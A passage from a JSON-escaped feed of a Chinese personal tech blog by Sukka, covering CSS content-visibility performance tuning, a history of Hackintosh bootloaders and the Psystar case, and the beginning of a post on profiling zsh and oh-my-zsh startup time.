post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 